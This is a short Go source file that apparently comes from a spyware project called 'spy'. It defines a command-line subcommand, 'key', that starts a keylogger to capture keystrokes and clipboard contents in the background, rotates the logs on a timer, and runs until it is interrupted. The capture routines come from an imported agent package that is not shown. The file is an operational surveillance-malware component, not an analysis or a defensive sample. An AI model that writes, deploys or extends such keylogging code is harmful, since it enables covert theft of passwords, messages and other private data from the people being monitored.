package cmd

import (
	"os"
	"os/signal"

	"github.com/cinus-e/spy/agent/keylogger"
	"github.com/urfave/cli/v2"
)

var Key = &cli.Command{
	Name:  "key",
	Usage: "Keystroke and clipboard logging",
	Flags: []cli.Flag{
		&cli.IntFlag{
			Name:    "rotate",
			Aliases: []string{"r"},
			Value:   60,
			Usage:   "Rotate interval(minutes)",
		},
	},
	Action: KeyAction,
}

func KeyAction(c *cli.Context) error {
	logger, err := keylogger.NewKeylogger(c.Int("rotate"), true, true)
	if err != nil {
		return err
	}
	go logger.RunKeyboardLogger()
	go logger.RunClipboardLogger()
	sig := make(chan os.Signal)
	signal.Notify(sig, os.Interrupt, os.Kill)
	<-sig
	logger.Close()
	return nil
}
